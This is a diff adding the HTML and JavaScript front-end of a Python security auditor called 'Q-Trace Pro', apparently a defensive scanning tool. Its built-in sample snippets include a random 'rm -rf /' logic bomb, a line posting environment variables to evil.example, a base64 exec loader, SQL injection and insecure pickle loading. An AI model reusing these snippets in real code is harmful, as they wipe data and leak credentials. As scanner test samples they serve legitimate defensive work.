@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Q-Trace Pro — Security Auditor</title>
+<style>
+  :root{
+    --bg:#0d1117; --panel:#161b22; --panel2:#1c2230; --border:#2a3140;
+    --txt:#e6edf3; --muted:#8b949e; --accent:#4f9cf9; --accent2:#7c5cff;
+    --crit:#7d0a0a; --high:#e5484d; --med:#e2a83b; --low:#2ea043; --info:#3b82f6;
+    --ok:#2ea043;
+    --mono:"SFMono-Regular",Consolas,"Liberation Mono",Menlo,monospace;
+    --sans:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+  }
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:var(--txt);font-family:var(--sans);font-size:14px;line-height:1.5}
+  a{color:var(--accent);text-decoration:none}
+  a:hover{text-decoration:underline}
+  header{display:flex;align-items:center;gap:14px;padding:14px 22px;border-bottom:1px solid var(--border);
+    background:linear-gradient(90deg,#11161f,#0d1117)}
+  .logo{font-size:20px;font-weight:700;letter-spacing:.3px}
+  .logo span{background:linear-gradient(90deg,var(--accent),var(--accent2));-webkit-background-clip:text;
+    background-clip:text;-webkit-text-fill-color:transparent}
+  .tag{color:var(--muted);font-size:12.5px}
+  .pill-mini{margin-left:auto;font-size:11.5px;color:var(--muted);border:1px solid var(--border);
+    padding:3px 9px;border-radius:999px}
+  main{display:grid;grid-template-columns:minmax(0,1fr) minmax(0,1.05fr);gap:18px;padding:18px 22px;max-width:1500px;margin:0 auto}
+  @media(max-width:960px){main{grid-template-columns:1fr}}
+  .card{background:var(--panel);border:1px solid var(--border);border-radius:12px;overflow:hidden}
+  .card-h{padding:11px 16px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:10px;
+    font-weight:600;font-size:13px;color:var(--muted);text-transform:uppercase;letter-spacing:.6px}
+  .card-b{padding:16px}
+  textarea{width:100%;height:430px;resize:vertical;background:#0b0f16;color:var(--txt);border:1px solid var(--border);
+    border-radius:8px;padding:14px;font-family:var(--mono);font-size:13px;line-height:1.55;outline:none;tab-size:4}
+  textarea:focus{border-color:var(--accent)}
+  .row{display:flex;gap:10px;align-items:center;flex-wrap:wrap;margin-top:12px}
+  button{cursor:pointer;border:1px solid var(--border);background:var(--panel2);color:var(--txt);
+    padding:9px 16px;border-radius:8px;font-size:13px;font-weight:600;transition:.15s}
+  button:hover{border-color:var(--accent)}
+  button.primary{background:linear-gradient(90deg,var(--accent),var(--accent2));border:none;color:#fff}
+  button.primary:hover{opacity:.92}
+  button:disabled{opacity:.5;cursor:not-allowed}
+  .examples{display:flex;gap:7px;flex-wrap:wrap;margin-top:10px}
+  .examples button{padding:5px 11px;font-size:11.5px;font-weight:500;color:var(--muted)}
+  .metrics{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-bottom:6px}
+  .metric{background:var(--panel2);border:1px solid var(--border);border-radius:10px;padding:12px}
+  .metric .v{font-size:22px;font-weight:700}
+  .metric .l{font-size:11px;color:var(--muted);text-transform:uppercase;letter-spacing:.5px;margin-top:2px}
+  .chips{display:flex;gap:6px;flex-wrap:wrap;margin:10px 0 4px}
+  .chip{font-size:11.5px;font-weight:700;padding:3px 10px;border-radius:999px;color:#fff}
+  .sev-Critical{background:var(--crit)} .sev-High{background:var(--high)} .sev-Medium{background:var(--med);color:#1b1b1b}
+  .sev-Low{background:var(--low)} .sev-Info{background:var(--info)}
+  .finding{border:1px solid var(--border);border-left-width:4px;border-radius:9px;padding:13px 15px;margin-bottom:11px;background:var(--panel2)}
+  .finding h4{margin:0 0 6px;font-size:14.5px;display:flex;align-items:center;gap:9px;flex-wrap:wrap}
+  .badge{font-size:11px;font-weight:700;padding:2px 8px;border-radius:6px;border:1px solid var(--border);color:var(--muted)}
+  .conf{font-size:11px;color:var(--muted)}
+  .finding p{margin:6px 0 0;color:#c9d4e0;font-size:13px}
+  .finding .rem{color:var(--muted);font-size:12.5px;margin-top:6px}
+  .finding .ev{font-family:var(--mono);font-size:12px;color:#9fb3c8;margin-top:6px}
+  .empty{text-align:center;padding:40px 10px;color:var(--muted)}
+  .empty .big{font-size:42px}
+  .symbolic{margin:4px 0 14px;font-size:13px}
+  .dot{display:inline-block;width:8px;height:8px;border-radius:50%;margin-right:6px}
+  .footer{display:flex;gap:14px;flex-wrap:wrap;align-items:center;padding:10px 16px;border-top:1px solid var(--border);
+    color:var(--muted);font-size:11.5px}
+  .spinner{width:15px;height:15px;border:2px solid var(--border);border-top-color:var(--accent);border-radius:50%;
+    display:inline-block;animation:spin .7s linear infinite;vertical-align:-3px}
+  @keyframes spin{to{transform:rotate(360deg)}}
+  .err{background:#3d1416;border:1px solid var(--high);color:#ffd7d9;padding:10px 14px;border-radius:8px;margin-bottom:12px}
+</style>
+</head>
+<body>
+<header>
+  <div class="logo">⚛ Q-Trace <span>Pro</span></div>
+  <div class="tag">Local-native Python security auditor · logic bombs · exfiltration · OWASP/CWE</div>
+  <div class="pill-mini" id="enginePill">engines: …</div>
+</header>
+
+<main>
+  <!-- INPUT -->
+  <section class="card">
+    <div class="card-h">📝 Source code</div>
+    <div class="card-b">
+      <textarea id="code" spellcheck="false" placeholder="Paste Python code to audit…"></textarea>
+      <div class="examples" id="examples"></div>
+      <div class="row">
+        <button class="primary" id="run">⚡ Analyze</button>
+        <button id="clear">Clear</button>
+        <span id="status" style="color:var(--muted);font-size:12.5px"></span>
+      </div>
+    </div>
+  </section>
+
+  <!-- RESULTS -->
+  <section class="card">
+    <div class="card-h">🛡️ Audit results
+      <span style="margin-left:auto;display:flex;gap:8px">
+        <button id="dlJson" disabled>JSON</button>
+        <button id="dlSarif" disabled>SARIF 2.1.0</button>
+      </span>
+    </div>
+    <div class="card-b" id="results">
+      <div class="empty"><div class="big">🔍</div><div>Run an analysis to see findings.</div></div>
+    </div>
+    <div class="footer" id="health"></div>
+  </section>
+</main>
+
+<script>
+const EXAMPLES = {
+  "Probabilistic bomb": "import random, os\nif random.random() < 0.02:\n    os.system('rm -rf /')",
+  "Credential exfil": "import os, requests\nrequests.post('https://evil.example/c2', data=os.environ)",
+  "Obfuscated payload": "import base64\nexec(base64.b64decode('aW1wb3J0IG9z').decode())",
+  "SQL injection": "def get(name):\n    cur.execute(f\"SELECT * FROM users WHERE name = {name}\")",
+  "Insecure deserialize": "import pickle\ndef load(blob):\n    return pickle.loads(blob)",
+  "Benign": "def add(a, b):\n    return a + b\n\nprint(add(2, 3))",
+};
+const $ = s => document.querySelector(s);
+let lastResp = null;
+
+function renderExamples(){
+  const wrap = $("#examples");
+  for(const [name, code] of Object.entries(EXAMPLES)){
+    const b = document.createElement("button");
+    b.textContent = name;
+    b.onclick = () => { $("#code").value = code; };
+    wrap.appendChild(b);
+  }
+}
+function download(filename, text){
+  const blob = new Blob([text], {type:"application/json"});
+  const a = document.createElement("a");
+  a.href = URL.createObjectURL(blob); a.download = filename; a.click();
+  URL.revokeObjectURL(a.href);
+}
+function esc(s){return (s||"").replace(/[&<>]/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;"}[c]));}
+
+function render(resp){
+  const box = $("#results");
+  if(!resp.ok){ box.innerHTML = `<div class="err">⚠ ${esc(resp.error)}</div>`; return; }
+  const s = resp.summary;
+  let html = `<div class="metrics">
+    <div class="metric"><div class="v">${s.total}</div><div class="l">Findings</div></div>
+    <div class="metric"><div class="v">${s.max_cvss.toFixed(1)}</div><div class="l">Max CVSS</div></div>
+    <div class="metric"><div class="v">${s.ast_entropy}</div><div class="l">AST Entropy</div></div>
+    <div class="metric"><div class="v">${s.duration_ms}<span style="font-size:13px">ms</span></div><div class="l">Scan time</div></div>
+  </div>`;
+
+  const order=["Critical","High","Medium","Low","Info"];
+  const chips = order.filter(k=>s.by_severity[k]).map(k=>`<span class="chip sev-${k}">${s.by_severity[k]} ${k}</span>`).join("");
+  if(chips) html += `<div class="chips">${chips}</div>`;
+
+  const unsafe = resp.symbolic_unsafe;
+  html += `<div class="symbolic"><span class="dot" style="background:${unsafe?'var(--high)':'var(--ok)'}"></span>
+    <b>Symbolic proof:</b> ${esc(resp.symbolic)}</div>`;
+
+  if(resp.findings.length === 0){
+    html += `<div class="empty"><div class="big">✅</div><div>No actionable findings.</div></div>`;
+  } else {
+    const sevColor={Critical:"var(--crit)",High:"var(--high)",Medium:"var(--med)",Low:"var(--low)",Info:"var(--info)"};
+    for(const f of resp.findings){
+      html += `<div class="finding" style="border-left-color:${sevColor[f.severity]||'#888'}">
+        <h4>${esc(f.title)}
+          <span class="chip sev-${f.severity}">${f.severity}</span>
+          <span class="badge">CVSS ${f.cvss}</span>
+          <a class="badge" href="${f.cwe_uri}" target="_blank" rel="noopener">${f.cwe}</a>
+          <span class="conf">confidence: <b>${f.confidence}</b> · line ${f.line}</span>
+        </h4>
+        <p>${esc(f.description)}</p>
+        ${f.evidence&&f.evidence.length?`<div class="ev">↳ ${esc(f.evidence.join(" · "))}</div>`:""}
+        <div class="rem">💡 ${esc(f.remediation)}</div>
+      </div>`;
+    }
+  }
+  box.innerHTML = html;
+  $("#dlJson").disabled = false; $("#dlSarif").disabled = false;
+
+  // health footer
+  $("#health").innerHTML = resp.health.map(h=>`${h.emoji} ${h.name}`).join("&nbsp;&nbsp;");
+}
+
+async function analyze(){
+  const code = $("#code").value;
+  if(!code.trim()){ $("#status").textContent = "Nothing to analyze."; return; }
+  $("#run").disabled = true;
+  $("#status").innerHTML = `<span class="spinner"></span> analyzing…`;
+  try{
+    const r = await fetch("/api/scan", {method:"POST", headers:{"Content-Type":"application/json"},
+      body: JSON.stringify({code})});
+    lastResp = await r.json();
+    render(lastResp);
+    $("#status").textContent = "";
+  }catch(e){
+    $("#results").innerHTML = `<div class="err">⚠ Request failed: ${esc(e.message)}</div>`;
+    $("#status").textContent = "";
+  }finally{ $("#run").disabled = false; }
+}
+
+$("#run").onclick = analyze;
+$("#clear").onclick = ()=>{ $("#code").value=""; };
+$("#dlJson").onclick = ()=>{ if(lastResp) download("qtrace_report.json", lastResp.json); };
+$("#dlSarif").onclick = ()=>{ if(lastResp) download("qtrace.sarif", lastResp.sarif); };
+document.addEventListener("keydown", e=>{ if((e.ctrlKey||e.metaKey)&&e.key==="Enter") analyze(); });
+
+renderExamples();
+$("#code").value = EXAMPLES["Credential exfil"];
+fetch("/health").then(r=>r.json()).then(d=>{
+  $("#enginePill").textContent = "engines: " + (d.engines||"ready");
+}).catch(()=>{ $("#enginePill").textContent="engines: ready"; });
+</script>
+</body>
+</html>
